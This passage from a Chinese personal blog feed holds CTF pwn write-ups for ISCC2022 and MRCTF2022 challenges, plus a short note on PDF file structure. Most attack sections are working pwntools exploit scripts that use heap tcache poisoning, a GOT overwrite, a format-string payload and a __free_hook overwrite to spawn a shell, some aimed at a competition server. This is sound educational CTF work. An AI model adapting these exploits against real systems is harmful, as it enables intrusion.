<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./heapheap&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5320)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Please input your choice: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please input the size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x480</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3d0</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,p16(<span class="number">0x9760</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p8(<span class="number">0x40</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">_IO_stdfile_2_lock=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">_IO_stdfile_2_lock=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">_IO_file_jumps=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;_IO_file_jumps&#x27;</span>,_IO_file_jumps)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print libc[&#x27;libc_base&#x27;]</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc[<span class="string">&#x27;__malloc_hook&#x27;</span>]))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">one_gadget_addr=libc[<span class="string">&#x27;libc_base&#x27;</span>]+one_gadget[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(one_gadget_addr))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc[<span class="string">&#x27;__malloc_hook&#x27;</span>])</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="h-o-s"><a href="#h-o-s" class="headerlink" title="h-o-s"></a>h-o-s</h2><p>这题的洞我一直忽视了，在num=0时会释放掉上一个内存块中的地址，还是自己太菜。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-39&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5820)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-39&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x601120</span></span><br><span class="line">num=<span class="number">0x601170</span></span><br><span class="line">buf=<span class="number">0x6010A0</span></span><br><span class="line">cmd=<span class="number">0x601160</span></span><br><span class="line">backdoor=<span class="number">0x400806</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x70</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(buf+<span class="number">0x10</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;get&#x27;</span>)<span class="comment"># free(buf)</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;fill&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x1f0</span>))</span><br><span class="line">payload=<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)+p64(<span class="number">0</span>)+p64(buf+<span class="number">0x10</span>)+<span class="string">&quot;b&quot;</span>*<span class="number">0x40</span>+p64(elf.got[<span class="string">&#x27;strncmp&#x27;</span>]-<span class="number">8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(backdoor)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="create-id"><a href="#create-id" class="headerlink" title="create_id"></a>create_id</h2><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./attachment-31&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">5310</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-31&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">x_addr=<span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;You will get the user id after you finish it.&quot;</span>)</span><br><span class="line">sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(fmtstr.fmtstr_payload(<span class="number">10</span>,&#123;x_addr:<span class="number">9</span>&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="跳一跳"><a href="#跳一跳" class="headerlink" title="跳一跳"></a>跳一跳</h2><p>无法getshell，调试发现也确实执行了ropchain，却不能打通。换了很多种办法，无奈只能作罢。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>ISCC2022</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2022_pwn方向部分wrieup</title>
    <url>/2022/04/28/MRCTF2022-pwn%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- 由于本人太菜了，只有部分复现成功了。 -->

<span id="more"></span>

<h2 id="ezbash"><a href="#ezbash" class="headerlink" title="ezbash"></a>ezbash</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>一个简易的 bash，用户每创建一个文件夹或文件就会申请一个 0x50 大小的 chunk。</p>
<p>官方给出对应的结构体如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DIR,</span><br><span class="line">    FIL,</span><br><span class="line">&#125; TYPE;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TYPE type;</span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">pre</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">head</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>用户的输入点只有输入指令的那部分，输入的指令会预先被放入一个 chunk 中，其大小为 0x150 的倍数。</p>
<p>程序中向文件写入内容是通过 echo 配合重定向功能实现或者使用 cp 来将内容复制给其他文件，并且出题人将重定向符号改成了<code>-&gt;</code>，由于本人太菜了，并没有看出来。直接使用 echo 功能来写入时，申请的 chunk 大小也是 0x150 的倍数，而使用 cp 复制时，其申请大小就为 source 文件内容的长度。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据官方 writeup 所述，找到了 cp 功能中执行内容覆盖的那部分，其中有漏洞部分为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">const</span> <span class="keyword">char</span> **)a1 != a2 &amp;&amp; (*(_QWORD *)(a1 + <span class="number">24</span>) || (result = (<span class="keyword">char</span> *)a2[<span class="number">3</span>]) != <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">24</span>) || !a2[<span class="number">3</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">24</span>) &amp;&amp; a2[<span class="number">3</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">24</span>));</span><br><span class="line">        v5 = <span class="built_in">strlen</span>(a2[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          v3 = (<span class="keyword">void</span> **)<span class="built_in">realloc</span>((<span class="keyword">void</span> *)a2[<span class="number">3</span>], v4 + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">memset</span>(v3[<span class="number">3</span>], <span class="number">0</span>, v4 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>其中使用 strlen 来获得两个字符串的长度，因此当我们被覆盖字符串与next_chunk的size位相邻时，strlen 得到的长度会比原本的长，产生了溢出漏洞。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>利用 cp 中的溢出漏洞，修改下一块地址的大小，并且由于 glibc 版本为2.31，因此需要的修改大小为非 tcache_chunk_size，释放后再作为文件内容申请，且不改变其中内容，从而泄露libc地址。</p>
<p>然后再通过申请一个较大的 chunk 覆盖几个文件结构体，修改其中指针来将 free_hook 地址放入 tcache 中，再通过申请得到。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,x)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;touch A&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;touch B&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;touch C&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;echo &#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">&#x27; -&gt; A&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;cp A B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;echo &#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf8</span></span><br><span class="line">payload+=p16(<span class="number">0x431</span>)</span><br><span class="line">payload+=<span class="string">&#x27; -&gt; C&#x27;</span></span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;touch &#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;cp C B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;rm C&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;echo -&gt; B&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;cp B 0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;cat 0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">1104</span></span><br><span class="line">libc_base=main_arena-<span class="number">0x1ecb80</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;rm 0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x130</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(free_hook-<span class="number">4</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x51</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">6</span>         <span class="comment"># 将 pre next 指针清空，防止遍历节点时 crash</span></span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;touch getshell&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;echo /bin/sh -&gt; getshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;touch &#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;rm getshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PDF文件结构</title>
    <url>/2022/04/26/PDF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>PDF具有比文本更多的功能; 它可以包含图像和其他多媒体元素，可以受密码保护，可以执行JavaScript等。<br>PDF文档由PDF文件正文部分中包含的对象组成。PDF文档中的大多数对象都是字典。文档的每个页面由页面对象表示，页面对象是包含对页面内容的引用的字典。页面对象连接在一起并形成一个页面树，在文档目录中使用间接引用声明。</p>
<span id="more"></span>

<p><img src="https://p2.ssl.qhimg.com/t0136824951bf7f4ba6.png" alt="PDF文件基本格式"></p>
<h2 id="标题-Header"><a href="#标题-Header" class="headerlink" title="标题/Header"></a>标题/Header</h2><p>PDF文件的第一行，指定了该文档当前使用的PDF规范的版本号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000: 2550 4446 2d31 2e35 0a25 efc5 96c5 0a31  %PDF-1.5.%.....1</span><br></pre></td></tr></table></figure>

<p>在PDF文件中 % 是注释</p>
<h2 id="文件体-Body"><a href="#文件体-Body" class="headerlink" title="文件体/Body"></a>文件体/Body</h2><p>文件头中包含若干个对象</p>
<p><img src="https://s2.loli.net/2022/04/26/DLjptEfukQXyrlO.png" alt="文件体"></p>
<ul>
<li>第一个数字称为对象号，来唯一标识一个对象的</li>
<li>二个是产生号，是用来表明它在被创建后的第几次修改，所有新创建的PDF文件的产生号应该都是0，即第一次被创建以后没有被修改过</li>
<li>对象的内容应该是包含在&lt;&lt; 和&gt;&gt;之间的，以关键字 obj 开始 endobj 结束</li>
</ul>
<p>使用PdfStreamDumper打开该PDF</p>
<p><img src="https://s2.loli.net/2022/04/26/32XSwWtdP169Eq5.png" alt="example"></p>
<p>会发现其中有15个对象</p>
<p>第一个对象中的内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;</span><br><span class="line">	/Pages 2 0 R</span><br><span class="line">	/Type /Catalog</span><br><span class="line">	/OpenAction 11 0 R</span><br><span class="line">	/AcroForm 13 0 R</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>与16进制文件中的对应</p>
<h2 id="xref-Cross-referance-table"><a href="#xref-Cross-referance-table" class="headerlink" title="xref/Cross-referance table"></a>xref/Cross-referance table</h2><p>交叉引用表，其中包含对文档中所有对象的引用。目的是允许随机访问文件的对象。</p>
<p><img src="https://s2.loli.net/2022/04/26/qWvuikQKlaePpcY.png" alt="xref"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xref</span><br><span class="line">0 15</span><br><span class="line">0000000000 65535 f</span><br><span class="line">0000000015 00000 n</span><br><span class="line">0000000137 00000 n</span><br><span class="line">0000000264 00000 n</span><br><span class="line">0000000294 00000 n</span><br><span class="line">0000000332 00000 n</span><br><span class="line">0000000481 00000 n</span><br><span class="line">0000000513 00000 n</span><br><span class="line">0000000733 00000 n</span><br><span class="line">0000000857 00000 n</span><br><span class="line">0000001026 00000 n</span><br><span class="line">0000041386 00000 n</span><br><span class="line">0000041467 00000 n</span><br><span class="line">0000045235 00000 n</span><br><span class="line">0000045274 00000 n</span><br></pre></td></tr></table></figure>

<p>以关键字 xref 开始，第一行数字内容代表该<strong>子部分</strong>中的对象是从0编号开始，共15个对象，之后所开启内容是子部分中对象的条目。因为提到了<strong>子部分</strong>，所以表明 xref 中可以有多个<strong>子部分</strong>，都是由数字开启的。</p>
<p>每个条目包含的内容有：起始位置、产生号(被修改过几次)、状态( f 表示空闲，n 表示正在使用)。特别的是，第一个对象的产生号为65535，表示不能修改，最后一个对象的产生号为0。</p>
<h2 id="尾部-Trailer"><a href="#尾部-Trailer" class="headerlink" title="尾部/Trailer"></a>尾部/Trailer</h2><p><img src="https://s2.loli.net/2022/04/26/xDBSQdIMN2rf6hZ.png" alt="尾部"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trailer</span><br><span class="line">&lt;&lt;/Size 15/Root 1 0 R&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">45699</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure>

<p>该示例中只包含 size 和 root，其实不止。</p>
<ul>
<li>Size [integer]：指定交叉引用表中的条目数（也计算更新部分中的对象）。</li>
<li>Prev [integer]：指定从文件开头到上一个交叉引用部分的偏移量，如果有多个交叉引用部分，则使用该偏移量。</li>
<li>Root [字典]：指定文档目录对象的引用对象，它是一个特殊对象，包含指向不同类型的其他特殊对象的各种指针。</li>
<li>Encrypt [dictionary]：指定文档的加密字典。</li>
<li>Info [字典]：指定文档信息字典的引用对象。</li>
<li>ID [array]：指定形成文件标识符的两个字节未加密字符串的数组。</li>
<li>XrefStm [integer]：指定从解码流中的文件开头到交叉引用流的偏移量。这仅存在于混合引用文件中，如果我们还想要打开文档，即使应用程序不支持压缩引用流，也会指定它。</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/kkle1994/article/details/81941029">【翻译】PDF格式详解</a></p>
<p><a href="https://blog.joe1sn.top/2020/10/06/%E5%88%9D%E5%AD%A6CVE-2010-2883%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%8F%8A%E5%A4%8D%E7%8E%B0/#PDF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F">初学CVE-2010-2883漏洞调试及复现_PDF文件格式</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>PDF</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP Emporium (64位)-writeup</title>
